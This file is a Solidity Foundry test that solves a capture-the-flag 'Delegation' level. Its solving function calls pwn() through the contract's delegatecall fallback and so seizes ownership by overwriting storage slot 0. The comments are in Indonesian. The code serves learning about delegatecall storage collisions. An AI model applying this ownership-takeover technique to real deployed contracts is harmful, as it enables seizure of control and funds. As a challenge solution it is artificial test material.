// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Delegation} from "src/levels/Delegation.sol";
import {DelegationFactory} from "src/levels/DelegationFactory.sol";
import {Delegate} from "src/levels/Delegation.sol";

contract DelegationSolve is Test {
    DelegationFactory factory;
    Delegation instance;
    address player = address(0xBEEF);

    function setUp() public {
        factory = new DelegationFactory();
        instance = Delegation(payable(factory.createInstance(player)));
    }

    function testInit() public view {
        assertFalse(factory.validateInstance(payable(address(instance)), player));
    }

    function testSolve() public {
        vm.startPrank(player);
        // fallback() mendelegatecall apa pun ke Delegate; panggil pwn() lewat
        // fallback sehingga berjalan dalam storage Delegation (slot 0 = owner).
        (bool ok,) = address(instance).call(abi.encodeWithSignature("pwn()"));
        require(ok, "pwn failed");
        vm.stopPrank();
        assertEq(instance.owner(), player);
        assertTrue(factory.validateInstance(payable(address(instance)), player));
    }
}
